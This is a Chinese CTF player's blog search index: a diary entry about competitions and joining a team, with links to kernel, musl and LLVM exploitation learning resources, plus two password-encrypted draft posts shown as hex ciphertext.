<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>最近在摸什么鱼</title>
    <link href="/posts/undefined.html"/>
    <url>/posts/undefined.html</url>
    
    <content type="html"><![CDATA[<h2 id="最近在摸什么🐟"><a class="header-anchor" href="#最近在摸什么🐟">¶</a>最近在摸什么🐟</h2><h3 id="2022-9-19"><a class="header-anchor" href="#2022-9-19">¶</a>2022.9.19</h3><h4 id="加入-Nu1L"><a class="header-anchor" href="#加入-Nu1L">¶</a>加入 <strong>Nu1L</strong></h4><p>得到大师傅们的认可挺开心的，下一步是复现学习一些奇奇怪怪…</p><p>唯热爱与信任不可辜负。</p><p>☀️</p><h3 id="2022-9-12"><a class="header-anchor" href="#2022-9-12">¶</a>2022.9.12</h3><h4 id="开学破防周"><a class="header-anchor" href="#开学破防周">¶</a>开学破防周</h4><p>开学的前几周总是一堆事情，终于有机会更新一下博客。</p><p>暑假其实说闲着也没怎么闲着，打了一些比赛，国赛啊，强网杯，DSCTF，其实都挺不错的，题目都很有意思。就是还是控制不住自己，学习效率其实只有晚上才有，但想到身体重要，也没一直熬夜了…</p><p>自己目前的心还是比较浮躁，希望还是能静下心来，一些初学时候的笔记现在看来存在理解不深瞎🐔霸写的情况。方便起见全下了，也下决心下次再写东西，资料一定要查好，知识点落实好，链接附好。如果有师傅看我的博客，我反而还坑了他一把，那还真是莫大的罪过=.=</p><p>🌧️</p><h3 id="2022-7-3"><a class="header-anchor" href="#2022-7-3">¶</a>2022.7.3</h3><h4 id="放暑假啦！"><a class="header-anchor" href="#放暑假啦！">¶</a>放暑假啦！</h4><p>疫情影响，军训和高数都推迟，提前放假了。暑假可以静下心来做些事情了。</p><p>校内的社团那边也要考虑一下招人工作了，可能有点复杂但必须要去做。</p><p>毕竟没有人一直在打CTF，但CTF总得有人在打。希望永远寄托在后浪。（为什么说的这么正经QwQ</p><p>☁️</p><h3 id="2022-6-15"><a class="header-anchor" href="#2022-6-15">¶</a>2022.6.15</h3><h4 id="赞美-Blog"><a class="header-anchor" href="#赞美-Blog">¶</a>赞美 Blog</h4><p>有点忙不过来。学校安排的课程都快要结课了，总归是要应考，而我自己这边的话课内进度落下的比较多（👴 知道错了），能学自己想学的东西的时间就比较少。</p><p>今天看了些大佬的推文，一些 CVE 的 writeup 只能称之为惊艳。博客真的是个很伟大的东西 awa。</p><p><strong>一个很好用的正则表达式学习网站</strong></p><p><a href="https://regex101.com/">regular expressions 101</a></p><p><strong>Kernel ROP 从 0 到 1</strong></p><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Learning Linux Kernel Exploitation - Part 1</a></p><p><strong>一个保姆级从 CVE 学习 Kernel ROP 的教程</strong></p><p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 1/4)</a></p><p><strong>Kernel 写的比较多的博主</strong></p><p><a href="https://www.jianshu.com/u/a12c5b882be2">bsauce</a></p><p><a href="https://kagehutatsu.com/">影二つ</a></p><p><a href="https://arttnba3.cn/">arttnba3</a></p><p>赞美每一个愿意写博客的师傅们，给了我很好的学习机会。</p><p>☀️</p><h3 id="2022-6-12"><a class="header-anchor" href="#2022-6-12">¶</a>2022.6.12</h3><h4 id="当-glibc-随风而去"><a class="header-anchor" href="#当-glibc-随风而去">¶</a>当 glibc 随风而去</h4><p>发现最近的比赛题目都偏向于 <strong>去 glibc 化</strong> 。这个不是咱说的出题不给 glibc 或版本，那种属于出题人要挨🔨。这里说的是出题根本没用到 glibc。</p><p>例如前一段时间比较火的 <strong>musl pwn</strong>，国赛的 <strong>LLVM PASS PWN</strong>，Defcon Quals 2022 的 <strong>Luajit</strong> 。至于 V8，Docker，Qemu 和其他奇奇怪怪的酷炫玩意，以后再碰 👦。</p><p><strong>musl 的一些学习资料</strong></p><p><a href="https://tttang.com/archive/1582/">Musl 程序分析和调试环境配置 &amp;&amp; 部分源码分析 - 0xRGz</a></p><p><a href="https://www.anquanke.com/post/id/246929">musl-1.2.x堆部分源码分析 - 一只狗</a></p><p><strong>LLVM 的一些学习资料</strong></p><p><a href="https://x1ng.top/2021/05/16/ciscn-%E5%88%9D%E8%B5%9B-2021-wp/#satool">ciscn 初赛 2021- SATOOL - X1ng</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/12/21/llvm/">LLVM pass 实现 C++虚表保护 - Clang裁缝店</a></p><p><strong>LuaJIT</strong></p><p><a href="https://0xten.gitbook.io/public/defcon/2022/quals/smugglers-cove">Smuggler’s Cove - 0xTen</a></p><p>☁️</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于 Jail (Working...)</title>
    <link href="/posts/undefined.html"/>
    <url>/posts/undefined.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="给我点时间QwQ" data-whm="Incorrect Password">  <script id="hbeData" type="hbeData" data-hmacdigest="c5f41f2d88349c945ba3ce5aa4d42ca5527bbec89372cd71d5ee5ebe3fe12cdb"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">没写完呀XD，暂时不好意思放出来</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内核 UAF 漏洞的一般解法探寻 (Working...)</title>
    <link href="/posts/undefined.html"/>
    <url>/posts/undefined.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="给我点时间QwQ" data-whm="Incorrect Password">  <script id="hbeData" type="hbeData" data-hmacdigest="56ffebe25d5fd766e6678b84683646d9e899b6e15cd3a9305ddd3f98615b11ec">61796d173c0eb5749165bf3aa4b5a13a735c1159136a6cc36897701bc9afaff2c29051d0ea4510f49a9a778445f9ca6bdde7d2a494b6ad2143bff22fac7a6cc3c883b68e20a909fbe4e3d93a49d5521caa60b42d76b66f309bb73cba8e8d1727fb364744d9efa31e29e4937c31644c6b5ce1c2179155234f53fca1907102fc7f64c66017e10ef1fe82f99e973fcc004a27774c2498ae651622252e5b386b86e3898ceeb39a536948a6a0e0b5278bf73d7c4662891ee775915d22391e4edac7285195ff6409ec154174e007706df83000d6a45e2e6556dc035c70b7d35c626b5412a077110b85ba6ecd74c2980612529d653b3d0bec9a375b5799b3df911ae8aca7dcf83e0333425400aac3c2f23f5b645b82ef792f6131b4e676d16ccc41133abd5f54ac8a8a4c46cd8a664620165e208801aa4ce9da234f866f04c30eae3c3d32ff4585bafbc4a4f93e719200e95d1b51ba746854591519071527bef4270564a1a3ef2946f505d2abd0ba3a0f0182e10c39257eb51cfa3e1fcaceca10f9f032dc5978f25f32a2ae5a5ff3171f26f9be703f9674a315857f93aa6764f531c71ddcdf9692778cadb1458dbf8557fe95b79dfa91825bd2e908209b2c15fd86a3747bfc705280c5fdc8698bfd6f6c9af60874db21956d0722e5f79f29703a6eef8a39b67bfcbf4927297924f6835e5b1f7637829ec72f1bf74cd87f0a0b43809983579d4ba8b456627eea3972763b0e3f1ce81c6d667577238b05d1260c2f98803647e45e7e933fcf37720582bd9961fa014c1a3ab6a365bddbe9c0ad0980f4c0e2440abdc32aa804c1b49581e97ab29fa41d89ea6cc262591ca21aadfbb1f8668b4646effc9c996e80e49985f12768e11dbb509f115d410363d6ad0fb5fa037fe8b25b71bdb251ca4d60b8c058252eff85010c382464771a9b000d1ea4e8946e2110f8c397e9546d38ad449d0a3a53a2895ac0a52d021df43ce2ad57af7a04bb0dbc6180bcde4d37fbf11b5129d319c8b88fa579546ef93b885b36b8e00f405c6499229daf54ea40551f2de6a203e401ed9ec799c116768f815ea72d6788c596becbc0f0b3b7fed82866b35553174198dea7be82fe18bc04154e307ebe68dced0e863d5c1bd31b2ea0e13b755ecb6647b2eb46701b753b24b5318e2eb80a1fcbd8b8bddca469722a492a510980c000182613ad381c70f418d5ddfa6860851c9583a2e63baed035fd68f459e9804526e4356d31d9f8d53d9a2a802c313eec4a73d11867526c51795dbfe4386d3367dc6df0f285157a0a3c857d5b525da2c504a82792ea05de197058673eb8958e8eb15319de957114befe243d3c6895cfc6d76450422847a374c77cdab4edd0316dbcff2cbe0a62b360d7b4b528612e6481db4bb5a536f626ad7516a50e6972189ceae1dfe0bd7683ccb639ead1df8a096fd8657ddb2e32212cc88636d4ee51f0fac299af4898c0c0cb80c0b65df48ca43eceb6f68b300ba389990418114f136f39a6b5c3af97b632032f6fe3f798eef156842e2e8fdf4103b37bd5afe3d265835e30039b0278fac7c0df1172451f9ba910ad50a1248b9cd4360421b3f1d5488baacec4f67fd13e881320346a5b5b9b6cd14687f1ba4462ad3cf94ae7829c46aa9d50c444f5951641e5c3d72c4bc67b7a162ae9ef3ee15b6619fa3e8ee3a6ea1fbbef8212cbb96b674d69a89c4d4fac8b96eb0a4fd6cda3fb23fbada764cd16b52feba4262c7da96f68a21d3cc73281f2037e84d4ff1a9df2d49d41ab2195d4fbcd13020c79d9acb7cb25c9664d6553f2b70c2e8464fecc131a887f8658a23532364190d29122b8874ebc8dfcc6e03fef3e21ddb1278430809194517cc3cfd739a1b881f7316636d37a68e5834d11550878cfe76b8c2ebe55c65a2c1784574ac03ab12d444c1e574bd30ecd53811f8afca4b560c726eaa868b60000c8d1b0fec4a8e2064436c588193d6305ab4ec703abc3f2a2de21e5fbe3e084f574129aa9e8580d97e18d5be6e779b04c28586e72c049cff70e02afe7be0fb593ed6adbc786373bc77a53f52c68fe0a5d28ca83f439b30b8f74a628360fd647d7b17cf31a00052662d221e095a41f49aaabb019e3edc44cd8c9f439b37ac3dbc27b340dcfebe261bf72c416b07c8071e81f47524f15e5b17dc974178a3ed9ebfcdb78cd57ea5050b0834f4d2cb24701b27e8a5a07342d59528a4b547d19a6056c1485884afe546bb97f78007a77c6c5fb92acda36516901e43f294c5d5672a539a6d21cedc8117e15b67bbf9feb504348482cb51c4f65b6fafa8ff2b5bffcc58b01fbfba54cb7ccb3f8e96f4d2fa13218efa2891c275b0f1d122147061f09e78c42c6c1ca2df9ccc2756d4778f4d4f1b0fc3e04844ef716a08a4a15b7f7c9d9bdc95e99a11a0bba02da44044698445ff03b7494dd2dbc1f4ff12b2834a1c76d6faaa12a800a88d53d257da52ddd472c18299a5db16f7d898ddd7fed39e6b24cc84e17eca5bb0919bb3b9c77fad1e274f507a113b54ff8735c8bb3ffa0f330e499872cf2234d202d62ac46404af36f7ee34f89d732758bbee22241885f5bb8b69615bcca43342544d1cde5328c5b4e1a6ac63cf0e99079d48ee5286fec8c53d03794c7db3e844d84a83c5f1a633ee44f810bc5fcd877c9b690d92a0b85336f7b82b99a28e52728f1c45ee7af88b58a7d2cdf2fb2eec931d3e7cfbc1502a6d945e6d569c7e3ff8d6c5b18d1602ed63a683565826b0129e19af71df524a99a429cf7ba011fab40589fed32d4239557135aba63cb4b988d19e98ab306cf0d5df728cb2fb373e5755d3b4f64b4114c7a10fa66d42db284832b1f73e8d9e5fcc6599d6fbd252f55d8d4de6bca16f4cc1aa449bb75397dce70c6d1f6108f5d72df8fa813e861d91ee37f89aab9c8a5dc4669abc7a128cbc3031eccaa3cdc18956db377e6c3f72410de2970a949c512275b37a7350774139b113775558af3a0cb7ff6c9c2bdcc89cb5d24be54600f79cdc01bc0a6bc68541ff6e1820cf08b94750c98f92b39936f7e30cf984a723fd17843dc7a558f47fa3e6529948a0c84c262c9f886befd8a1eca311811c0b13856ed05e5aed6fceae8c76cd090934e0789c8a71082d20dd1552e0e6d6d6ce0d6ba23b5c3c79c66b35c439f4437489bfe4bfee0bc8077f0aa67ea5aa4fb1414f6c585fee1d6dec92b2b9d9be4aa10abdedd8a540933be39f7fbac31c7525ff51aa26e72821930e67309e4f67ddf8497078fa37f485064170bb5f488881ac6225021b02003fae8d922087bcb75d16ea1afbdfcd2a61295bee443add266aa21ef2b31a2aa80aa161a22c1b7e370465856e705fb67d0a59535ca26cfad9455cfe8df911dd4edac011986992250369c21dace2e0d316032a6a3b0a2965947c3168608a5d7d58e8549b934ffbf95cb970dacf246364efd4b59b3ba36b6d49ca2838ebdf8ccd136e7d8ef95947f2713432f49b107686b13fb26a8892c5c19bf765230dae4e8efe8d3ce056ad366838a017220bf289cb1440ff4230e375077c4fe52a5d992d1ee96bc0354f19f89c3e33f1103f3431b4a75437d2991f18f821ff63ea716e0e9c362a7bf089feb69cb24d9f6430127d1b8f6a282cd093d67e153068d8aa86ffed28f18d0b5018d749e4ef8c45367c3a5140bd8444a249a3d6696c21babff6569d9ba1991016c66f93425a14b7848331f0d70d6c4b14a90ac14bb2e3425abc820070917ed1c60f2fca5aa3fd76ff873dec3ad1c202c4f4c3eee967b75282bfc6a01478d711cb031bfa481fc83b3ae9d23f3b9a181c4f18dc163379055ff87761e285bf28979ba480a96fe4a98706f10e03783d7a54b25a6bc76dd056a93f18019fb7ddb118644289d3473ea92232b08db1195d630d8503316270137795cdd9394bd1cfcc60e7f9d961fa1ad6bdf7f1e396951f0b44193713a12c4f4c5be5ad1130dc498ed69ea19ae83eb68b8cb90edf0343e4ae86341aafab85b092b7d394a9b87137f39dc353fab0e9cf9a281fe48c826cfd1260e928ab2835ccfc7d7d1772fc3567dc9f73d7acd21293b9f5196fcb01c8bcb0ccb1e47d0087e0c825950365438fd78cf6caf749cfd84891c76ea3131f135822ab41b1dd7550e7a547982a777a2597365720e4477a7748f7916e6b44c830dd25d22efdd8cbb8389a5d373c3d56c801e1d93f4c9cd34cccb87a79cf38b4d458e1013934d20e0400ef023798c60523e22a2222b5ac316df1216ea7780556ed94a7d450a941ff83b963e9e153df7a155a2812b92828d939fe1e7b3d0063234ff965d7f7f29cbaa437052fa29fb68748ff06c8d0b4998359adc8a809613f19cd23697b7dc5a7d44d5d491e3491e56d50383dc1e2f59a54c86804195df3bc3d1f438bf4d1441c2574cba6763faaa63d6a950c8237ba88a7949c34f952f3c10c7d4355402e16e12147206e23e097d90e1a6ec258d15ce29392079f9a4b8b1d657a8c8da7a656a987204babf2dff5f5a6602d2e21fc40be91b6fa52c106e5bdd0518be8f816c0d8779791593e3648018d8015a7d5d45832e01499cf8c8552868fe5395b64ecc165a882473f73fc8439497414912082fbefb49e45def8d66b238d60460b93b7bf8d955e6501fe11d0843d7e7c6fdf71af406a8b031aa8f06ad7d2495e20fc04274be7e3db01283d70bffb6d77505eb6cf1e698467c6c40847ba602b146fe775b8d2ab95a619fa9a9130dc4de84a54a9ec3f67f287b4ed749e405f070c9d300a72056bc002122cc402a5a25ceb1420cf9dbbed719fb6959330eba2662f559a9116d8cecbf1ff74b7821655198e41c7d45406ae980517e53f665a23b05c7fc94dfb774e105e17f6d7970018c5b191f387aaff640c19a2d9709c991a453c9949c13b8b6f62605ebeb6008bfe8fd689e1c49d2137e9a4c72f2cafc9524c5058c7ad2a028047b1aea0bf0023d70ff5c9f6eb22a41c73830657bf538fa42b3baa67ceea817efdc504b71a355e77020c293930fa24a379f2324d972b69c486e2977bc0c66fe7d97f78854fd2bf2d8dce5240381746e9053edc8e079ef6982d421774759d1c9e01aa4df788e202cc1e49218241e449f8a0262a413abeb14d0117182aa1ed38939cea80d225001cd0ed54b5dae287bb6eef6098a9f1368b74c885765faeaab734b1072fe5e42fc8d6ee878ac687347854e90e43d5da99ba2e4e4f95c48f534e9b33774324768ed775fbff800eae22390dbbd0bf16133b4e9490cb6420b16376fbe5546b29347358ac8d430ad65d105f1f547ff3f1dfe70d373beee0e6005564593fe44b8a24d8b13189823f4a73543077e7d64706398e0cce779bab0dd94f3521733a6c55ecc85492ce6fe5a69de0872bf222978d3d5622a473c10b0cd7583fc0215cdc5c68061ac316305a0cb294af1407a8e05108db90b315addf4dcf6f43c4c77181bc30d43df2fcf3bb8cf9391584e9b11ef4fe16867690ae512366392c2cf2eca5254959853b35c10d7cc21f0fdce05b04e47d95944668097c4c1680a811bc7b412f5274192b730c214c5ca88727da53084bc32c9f4965e47617128a53513f859f2033489ccea5375c785ba797bf0bf0bfc7e6bdc8ce067a1dbaa42977c1e91a536dfaef2f143cc4b9fc0e277534a82a0b1b4de05972c6866714540f885422ef86f18c51c3cc4814b4832f47ef37c7b4cecdb51dd626baed911f5b6dedb0f8a53759ce37372ad82175fd60a2e3ad9efe15b16e7dbb40e08ad98ab40f17cc20889ed453eb94ff4803d77425ddea27932f1df8121b448950472b94ead97b3c10ff3447a62d6b823acfa36b65aff80b2e9509a6ba59159a73302780926b1c5ca0b185a6d5badae2e62967fa665ccf81e4703191d48f363577de1266ff331b37a668d8852c0c385e38b59c44f497332a7133a9ec9c5d2080bca84cd5d989c8eeef9e7bd57a9e3a1bc41cd29a5461f0748638ece6cd5ed4527a980f4c665b5930d1c4fab154fbbbba030ac6f08409780b208783ec38d2c7fecccbc78021bacf3b8873c962b5c415a563a1b69e8ab6850401e1c6a39ddadb1ec1e45df9a90b66102b4b0e2234103682627a04fc4a79441d58670a9e49d1ea9d5397d04d66cf8b9bd0e365ddf22841dc9bbe8a590231e6465af012c76bbcaea46e352a1954a9cec9ff1da825ff55e3222461c515cdb700aa18bd0ac8e7e35a2f586aa1048b7237083a85aacf6bc87c54017173172370de0c34c8d41d6287ed41bfdf5aed80d4f7e309f94c083b7af08e0b7a81d2510aaff5e83ce7fee66094453f37e14aa9ab51cdc7a9350525007a922f34c2c3cbd25151a8fa008d7b95bf0cfa66d20b98d1b059af395048b0c9bf4825d7f92933b64880304cc93ac43f0f2c2226f1e284abd4da8d0e21506a16908a2fd4ea0b2a9ea1553cfdb0ced6f58d93b008a8c21f53986a964c766d63e1d2890cfee492da553ec93e3f2da059efa9d71f6e4e54abb70ff0ceb8e73d4a5b42ba895216d772c515f95255460e8ce7c85a6942d72bf4a731c5377e89dd8d2cf5d4fef235b7667ed652378a6ed144aaaf71f47bfb2ab1a0ecb1551f7ed251e6752b9eb2ce0d103429659bba3915406d5f454167acf1fbeb29cd5b2f19bc019e116b62e0431dfbc14c156b1c691fd53b7165d01a2e01a6dd67bd646a038252e25f0197e92f3cf0ed6dd4c577565560f10c79ef76f1207b8a418ec235ef473dbe2bfc2560b5e1f41d362c7ead72a01e26e6f653bd33de481e5bb2d13371e5e5e644833021a4fd02d44e23a643ac36e96460f5791020b58bb04c2b488575feff81efcb4deb58bce19de046c92f0bbe2ed3cee21aeab1b8c4f5b026e2ccc41f6902f667a8faa09397ea9ad7eed3953309a729d41fa979c13ecba2425900b75df3500e3f6b175012aecf4a34e867de2602cf3c1e78142661942b6be8c1254080820b96ff3047ab98fe0d88eed57523523a5a25147addea9044fc7b721544cbe649e09f03a4e7e299c24b877c679f56b8212d3f893f6e0b1333831e341118ec3873746cc367791aa87b27f45e9f0f54287f53e5eb4b6c4c9656bb071e202a4830503556641dbf8a374a109ac7cdb0135fe646e4a914590bcbd21ea244c2016e89668eee2f3d46b2cdd69d545aea768762dcd0f14dc9917cbb561aa1a45f599450f6471af07badc5a2e76c099544391c5fdeac2e1a44ce7a470603e77a2de176466055f0f7028f785bd3049be6da0841fdc603b94db04ec08f110c09d93996cc117ad908de6d0c3c494e8538d4d5077b06ad61d4a0c0598a3b746b680c484ec62ab1a25528260d82a05acd9f8ea9c9b0a681595e417b6c3e1d3ce52f598350904fbde0483d76ea87805037201c43c4fe31bad3329abbc0bf3af12181662042628b2f742326f3212073f683bfba83e07283bc17643e32454b766669baad2966f4a0745c7a8e02ca227cf5440044abf45d52456e957749e2a57dbb02b27e7f806a1d9661f5b53b5b5a35f1df11ddd77fad18a13d62e6126fe20dac4520f987968f3beb29b067a2b0ef3d493c6ae90e79570ac66b358ffe43ebcbd6ff993b80ed1c7b828124c845143f6816eeea6bb1316f47ec427476b0bc6db5d8352d57668f52aa8d670b7d58f7b79033996858f0f2bf9d243090a0c370d574f5e35389115ce8aa313224613ad3f885667b9a6537ba82dcec0fa985a8779768559d4b46502c0484ccd05f21eec5a9c46a41de2b79048296a034b4b2dd6ebb7e3ac65c4e9dc0572be23fecbd1736f49e7904d2fdd37c3f8e15352efc9c25b4ca2874618cbcc2115153a73ca793bf69b6f757638441dfb41415d05b284bae17fa6d0291a74f4e8e1d680eb50922d7247b8b526dbc41c27508f5ecc470f6d41d5d8ebdff06ec0035f44e1c8acaf8dd580b912e8a7cb8e5f3daa70226e69ca132fc639aa9ba0292141d57b4f5031a06d677e1ea446dac26365b4d0b6c421b83b357fe3eaf514331d5d9aff49cbcf31823d469712456555a6a1c1d1b85d9ff73ee50f8f34191d5d5b490bb072ff8350dfc1d22cde6fee6cd5dab63daa6f6b7d101d7b583d38aa57e818f776361fc589c1dcd480fdd081af9b0079dfe3c77daf922351efaf2fc9c7e9d34bcb9ee8c85bd6e9e45e3a416756dafe734eaca05610ba98d7f39cbb967a94588930e43947da30ff0aad46d26e9488cefbbc0ef61a959b2953d89aae8d7e3c3d2d18c921b804d13b93f2e19fe14ca1c294937606a8e77fe0223bc1b5c68be64f35ee0c85a5eadf0c257fcd5cb125fd116663bb2a9948bd10d3710aa6548b7029d6f865f975ff7cc50fc2b3a9471c127e0f0d283be9894caf234660df28a4a1ff5d0dfb12a17c17e5ec01b2f833b42d7169ec26e4bb1653af10bf0a065efacba90140517cc6205dbdea294149564e0471b4aead315f7d6858c75370e860cf08c555f9213d40311a34620b23422dda2a69bf6bf10aee0718ad7016b8f210870e43ffe43a95b4dbb510a0102ec1f0c12c6129bea4561bad3e1a57e12737b48e869ee3f4dc4d53f5ef340e51e164b78e19969174ea72f312caa8e4c803538f6a5dee2c664f4b907b52af86b59c0e998437826896de0d47360765b3f6f5c19ee4cea89efca7ef230562271e0816aa286e28396558466c4aa8a66c55008f88b9ba36725fbc7c98e6c117d3e2da0d4e210775cd262dbf2dfc4c2221bfb41522bdd27f8170622147ccb8d6ed3736c59ac854229e52bc912cbdbbedf3a2f5c7de80dc2e9ed5876cfd3815bc5444817ccd7ffee3e11bf18a28c4d95d66e70d529726b6f5706419d57aec8918860836488ca0631c63a83798ee904ee25b206f695b8888b15684f868f04ae95bd6d30f89723b4cc64725bfd80eb92f4c44ab67d9ef679bfa6a965a892bf5d89eb4115008ca4f6d7c4621d8ebfc7240dd77eebbccae4e4d040aeed5aa872d67ad71f20d49ab06191562612fc0ee269b24ba7a70e5234fb708836e22dc44068fcc1bf047441fb63b0f8cf15f2eaea3e3ed37616c2cf2fd5c9ac487509d4c2bf59df64c40b820da7369b1d2cc94fa2092fad02071738a01eefc7e005aaeb0933b77b78a8864ddceeef67b8a67fa472d738dac8cfa5f23b8fd9074756bf16aa995f996491caeeac32fce81d176e69513f0ee66285a81acfd3280e1b4268feb31fa50eac37c20a0fbb06e4434d68f7d739da2cf85e30d635d0b82e8f425360622a777f11b3ecabb0579c8910a5c3bd70f95c1445fa15ae2d1a89655793ef25b68b713808c3f1250d2aa7f627b66b3538319467d2381a67c686d7c83e3d5ee0c46f97aeec2a8869502630e8b36a50b615ea0b637b92917272e76b8c66584bddd62abef6da012a7decf585477593d008eeb243b295fb7518f9e254d5f09033e7dc136ebabd255ed66d295541e2a23feddee35455dd6120fbd9c839abf56623a656323002ec985bae492fa2fdf949908c022faaeeda4f55a6b0a4aca0966a01add9a228f8ab574d5b97a6a53c1d086104ac9c60bc593794cfe5244d026aec1b89b731b985c57f2b545dea4364ef96243cc96ea887ecc2f5b3300554770640dbf7f79d96fed75a5d84e4487536a7827261b78faba32739dc9ca5dedeae3072647a5e594c61874fcd8835474d4685b094a3dbff5bf8e5f57dfce91d7d744284fcae0f0ffe901d7c08010c6f7a2f353cac54f6ff347d8e7723dfd2efcd545f72d3aee4accb842b937934bf975e153328587deb7e2b04490cc724d737b5d932e201d0016b8ca734c106b9c6e9baa6a390eac8946dbbaf5d3335f56be07cb21e8452820d328d4d47b8677ee02916073a4e0aaf42d9c72dde6e258c493005273c376c57f605c7f98280dc75f324201a6662cdfb2c2ef5eda7f8d8adcb2ee05f4c282bbc240101a1588d9ea8dac6b1672571171eb605460820a90b0cb5c889f37c5b3b52ba9e6b9090d128c60337eeac4ab62e44d56a1442d806abb8fa6a012f00f904ad9b4239c739ded95c6fd00f26b5e7fff527f293fa0534a35595a8fb71755e6df426cd6963d36deddfb0c7199b4269218150e670c015065c0e55768e5dcccfc67c2d270cc1fe90b736d9c3481e66089a0f9c395a4ee8543f7a03490c2f61b2975eaec21eb55ebe8a7471c4804339a39c3c7f422a8e5d49401261dd09c7b073ef9d4319388f957028e5f00cd36eb5cff07e6e35625972bf43cbabe14d483e206052b004fca4ea05a5b6dc4ae77d98dee310143cd22fceccff0e338542668bb96744fd32751b51cbd292587ea4568f5457f3f1716cec0f80ae0e2faafd117a6630f54467b83a5c3ac00527de95c7ea87c3c7044b57bee3d2167770c998592cc1d01ee49d350a23bc6722b07be58143b6e712d529f0478c0195ea2ca3974c2942eb94a5d7087434bed483af2ba30f4d7039450c1f6f057735756696511a97e6bd8be0c969f587947bfd380bdd05a4bd44e469a1991d2fd7b2b35f63d2898f61ffd6448f68b8503ec45a6d8c1f82f41224c875ed3608952cd6df4cf751c627f72bfd0049fa96b68fcca4b9ff35dc47b296eba1b65e3e4e779c9ead7d0f100627be3446183798a75b9a3d64b94fba03dae46c8405b26891326c8ac4cc483e38dd554d264a2c5e8c384845bc450c27f85b0f8ac5f64a21e74675b353dcf1fcd0dd7a2ae2711c58cce00a6d1198b3e4e40f007a41210f6ce35bdd42b2453334151625e7e8814c39f938d4619ba8d00b892a396ac079f6cb937db6aa3d0dc15ff1b77bdcb89b5b00d111c1275eb7284a09f8f5546101fd3a24ffa53e7ae31fd638f8e77d99f7afdee3e75516c2e498761e5eec725a8922bf43d07331e8b692155bb4d10c47d0d9d42baabab3f9dd0204c38bec50b523484805cbb689f76caf4079ce29db319609f45161a4a6cf19b26e57a055bc3e73d0e219d1b0569a31212dbec87bc1ab7a2209e9c9eb20d378333cd09f3eb5a8c3364a1f48f8f1bd164204af43ec7e670dbcfe60270fc5779ab6fad939abc783896b91b7a873d5b1366aedf409d2f4004b7928664a346be277f1d12f4eb98db9f839165aab5f2ff939158ee36ed20f7b3f37cb80c236e1cb4f80408040dbdd420249a8495201ce47be2a651c5f46252487bbb047d4f05c8e5d55e59f9ef1ece119d953658b3c95676acacacfb632a78ebaee8c9b7bfcd7e5a6d6f76106f1687d7f275a08583d0c1bcb7bb5b5ec8acd6a90644ba5f4c178d351df210a5428291e8fc9d428cc0869e49b88c9a9e462c90c67a12c1f269334300296ad7ff9bd5bb838f05de3e597ca6b6d1c6b8184f4544b01448c1c670fa18b1f664a490c35f7db23dfdb216fac262cf9a075427294861719a0d4555a8e5aa8c4745a629b64a3b95fdb8ec045b9daabc444a78a6f407d9c8e6401a2724f79586c76fc259963275d660420f0ed2efa48f6537002473fbcdb796aab447e8c208db64e9a9d539c968b546eb6dab0219e5ee318c1518606f5ccc50f3bd718a21ca9ccad6ba21b9a975f58c629d307ec2d11017c91a1663a706ea7d2a5190357db0e9104eced679e0c89b615a7df5e43d632da02e669441fd15f78efbedf30524506af8e94078a8698526e29f1f498393e5ae881cf9a3c339bd9e62888dfceca7173031447e4c9fe27909928e21839426d4b17653a1de3ad8232bfea4db8937b8130c11250cd84d89dfc843daddf0bffeb0c768942da42d802cb38906b7f6d6d04e7afa0dd8b3a4a3d1916fa933dc42eaff4ffe4fee99ea5d0b7e693f9917afd23bafc5b750b4fbfa7ca493b8ec31126323921e8ea2cf9e0e8ea98a32f33e4f50d9b2a4782e64821bdb210589d5f21332bcbd092169e5bec29126e237cdf31f3e50131227a33b880883c7ee10b7175e1dfae760734532abee21847e6a9ab69aa9b34fbb9dcb3afc4893d5d55543789a88ff5132386f954fcf4e7385a4cfb248cbf22bc166e5cc79fef60a86efe7fcb881fd3c7d3b534b73d26a918aa1e24409f1eec234cd6cfec849327f0e9248fc36ae5d38d66e81f75db80610256fc5e73358ce6638a900df109a4c3c07b4cf81e4a25363dec4bb57ae9125d424d7b9be4d42ada448d31d4009ddaabe442b56640e21b62f743a4fc08ee090d511ae8dc5ccdbc533cc153926dbcfdc5c9e598d1d53f7a1182243f7ba13d55c0345ea4bcf2fa722b8a52571e26b91733e85fb3557fd8de8a449ccec7cd827d1fd32cee67e1a059b0a7a966062450732f99248540f945c7a626ce0acea580204b728569696cdd7bd39f9e7356dd89af76043c354c1e8c3a5ce498a27ad1d1bb7a63e64554e30bd59fb929dae604adc1f0e80466c92b2f43866f8f6b5a8f2c0353d653019af528c9429def7e99080fc06f63da9c4561d58530c06c132c91fa253b468870e53bdef2a60a7985df9b87fbea2abc48e7f06d52c163383b6ec5dbfc685b69d2fe1f342d2e6c4ddc63d70d919658a9858a0e2c92e7324041641f299db9b03a78304ca473ebd031fb2df25845ac265c571516d2dc407c4aafd75dee58b0b3fab26b7a67383adc4036df168fcde002252e3a09d0bf5df0c1a2cd6d3297dde69a358b085e2bd067967fdf2bc44bdd099e00e647c23be4090a34ff54d3021d93df61298dae896ba434e44c8bde3bd9a4e36a8e5aa32ec0b32979e781259f2e947b5d0c2e121d0dca984f6d367ad627a336f731af57d231e8e21ed8d3a1012f9e60fa30d1ef5cfb0be52ee6bdd39ec1f2679841fa009a4ef4c0887526cd5b630d5727139aa2f0259c0da31e6ffc7c348fbd3bf95f21789fa7be923f2a81eb065ce0342c1ac78212839b8138c0220940c60f660a0e2690926dc9f8e91701fb64d776fd6ada661546d2387ecfe4d072243192fd0326399a7d15f8db4bff6f5c0e1655bae8047628addadb09c386c25b80f864c928318f3e845974765a0e4ee41f8e745c51e078b9349ea9